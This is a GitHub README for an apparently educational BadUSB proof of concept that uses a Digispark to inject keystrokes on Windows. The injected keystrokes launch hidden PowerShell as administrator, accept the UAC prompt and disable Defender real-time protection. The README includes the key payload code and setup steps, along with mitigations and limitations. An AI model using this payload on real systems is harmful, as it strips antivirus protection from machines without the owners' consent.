🇬🇧 **English** | 🇪🇸 [Español](README.md)

# Digispark HID Attack - Proof of Concept

![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
![Category: Offensive Security](https://img.shields.io/badge/Field-Red%20Team%20%7C%20Research-red)
![Target: Windows](https://img.shields.io/badge/Target-Windows%2010%2F11-blue)

## ⚠️ Disclaimer (READ FIRST)

**This project is EXCLUSIVELY for educational purposes, security research, and authorized penetration testing.**

Using these techniques without explicit consent from the system owner is **illegal** and constitutes a crime. The author is not responsible for any misuse of this information. By downloading this repository, you assume full legal and ethical responsibility for its use.

## 📝 Project Description

This project presents **applied research** on HID injection techniques (BadUSB) using a **Digispark ATtiny85** microcontroller. The objective is to **demonstrate a physical attack vector** that allows automated code execution on Windows endpoints.

The payload emulates a USB keyboard to:
- Open "Run" (Win+R)
- Launch PowerShell in hidden mode
- Run as Administrator
- Disable Windows Defender real-time protection

**Offensive focus:**
- Understand the attack vector from a Red Team perspective
- Analyze physical security implications in corporate environments
- Demonstrate the effectiveness of HID attacks

## 🎯 Attack Flow

**Simplified version:**
`USB → HID → Win+R → PowerShell → Admin → UAC → Defender OFF`

**Technical version:**
1. USB Connection → Keyboard emulation
2. Win + R (Open "Run")
3. PowerShell in hidden mode (-WindowStyle Hidden)
4. Run as Administrator (Ctrl + Shift + Enter)
5. UAC interaction (left arrow + Enter)
6. Set-MpPreference -DisableRealtimeMonitoring $true
7. LED on (visual indicator)

## 🎯 Project Objectives

- ✅ Demonstrate that **physical access = total compromise** in seconds
- ✅ Bypass software defenses through keyboard emulation
- ✅ Automate post-exploitation with PowerShell

## 🛡️ Defensive Perspective (Mitigations)

Although this project demonstrates a physical attack vector through HID emulation, there are several measures organizations can implement to significantly reduce the risk.

### Recommended Security Controls

**1. USB Device Control**
- Implement **Device Control / Endpoint Protection** solutions
- Restrict unauthorized USB devices
- Only allow organization-approved devices

**2. UAC Configuration**
- Set **User Account Control (UAC)** to **"Always Notify"** mode
- This prevents the payload from executing automatically without user interaction

**3. Endpoint Detection and Response (EDR)**
- Many EDR solutions detect behaviors such as:
  - Automatic PowerShell launch
  - Commands modifying Defender configurations
  - Suspicious process execution from Run (Win+R)

**4. PowerShell Policies**
- Implement **PowerShell Constrained Language Mode**
- Restrict execution of unsigned scripts
- Enable **PowerShell Logging**

**5. User Awareness**
- Train employees about the risks of **unknown USB devices**
- Implement **"Do not connect external devices"** policies

### Security Conclusion

This attack demonstrates a fundamental principle in cybersecurity:

> **Physical access to a system can equate to total compromise if adequate controls are not in place.**

## 🧪 Attack Limitations

| Limitation | Implication |
|------------|-------------|
| **UAC** | In "Always Notify" configurations, the attack requires manual interaction |
| **System language** | Left arrow navigation assumes Spanish/English interface |
| **EDR detection** | The `Set-MpPreference` command is known and monitored |
| **Timing** | Hardcoded delays may fail on slow systems |
| **Privileges** | Requires the user to be an administrator |

**Note for Red Team:** Documenting limitations is part of the job. Knowing when an attack works and when it doesn't is what differentiates a professional.

## 🛠️ Technical Requirements

| Component | Specification |
|------------|----------------|
| Hardware | Digispark ATtiny85 (or compatible) |
| Software | Arduino IDE + Digispark support |
| Library | DigiKeyboard.h |
| Target | Windows 10 / 11 (for testing) |

## 🚀 Installation and Usage

### Configure Arduino environment for Digispark

1. Open Arduino IDE
2. Go to File → Preferences → "Additional Boards Manager URLs"
3. Add: `http://digistump.com/package_digistump_index.json`
4. Tools → Board → Boards Manager → Search "Digistump" and install
5. Select board: "Digispark (Default - 16.5mhz)"

### Upload the code

```bash
# Clone the repository
git clone https://github.com/fredcastillo/Digispark-HID-Attack-PoC.git
# Open src/payload.ino in Arduino IDE
# Connect the Digispark
# Click "Upload" (the IDE will ask to connect the device)
# Disconnect immediately after upload!
```

### Execute (CONTROLLED ENVIRONMENT ONLY)

1. Connect the Digispark to the test machine
2. The payload will execute automatically in seconds
3. The LED will turn on upon completion

## 📂 Project Structure

```
├── README.md          # This documentation
├── DISCLAIMER.md      # Legal notice
├── LICENSE            # MIT License
├── .gitignore         # Ignored files
├── src/
│   └── payload.ino    # Payload source code
└── docs/
    └── analysis.md    # Technical and forensic analysis
```

## 🔬 Code Technical Analysis

```c
// Open Run (Win+R)
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

// Hidden PowerShell with command
DigiKeyboard.print("powershell -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");

// Run as Admin (Ctrl+Shift+Enter)
DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);

// Accept UAC
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
```

**Features:**
- ✅ Simple and tested (less error-prone)
- ✅ Clear comments
- ✅ Status LED on completion
- ✅ Infinite loop to prevent re-execution

## 📚 Concepts Learned

This lab helps understand several important concepts within offensive and defensive security.

### Technical Concepts

- **HID Injection Attacks**  
  Use of devices that emulate keyboards to execute commands automatically.

- **BadUSB Threat Model**  
  Risks associated with seemingly harmless USB devices.

- **PowerShell Post-Exploitation**  
  Using PowerShell to execute actions after initial exploitation.

- **User Account Control (UAC)**  
  Understanding how it works and when it can limit automated attacks.

- **Physical Security on Endpoints**  
  Demonstrates that attacks don't always require remote access.

### Skills Developed

This project helped practice:

- Offensive security research
- Attack automation through HID
- Technical vulnerability documentation
- Analysis of real attack limitations
- Understanding of defensive mitigations

### Educational Focus

The main objective of this lab is to **understand how these attacks work in order to better defend against them in real environments.**

## 🎥 Video Demonstration

Below is a demonstration of the device's operation when connected to a Windows system in a controlled laboratory environment.

The video shows:

1. Digispark connection
2. Automatic payload execution
3. "Run" window opening
4. PowerShell launch
5. Automated command execution

⚠️ This demonstration was performed **exclusively in a controlled laboratory environment for educational purposes.**

[![Watch the demo](https://img.youtube.com/vi/6TkrJ9Ly8XQ/0.jpg)](https://www.youtube.com/shorts/6TkrJ9Ly8XQ)

## 👨‍💻 Author

**Fred Castillo**  
*Red Team Aspirant | Offensive Security*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Fred%20Castillo-0077B5?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/fredcastillo11/)
[![GitHub](https://img.shields.io/badge/GitHub-fredcastillo-100000?style=for-the-badge&logo=github)](https://github.com/fredcastillo)
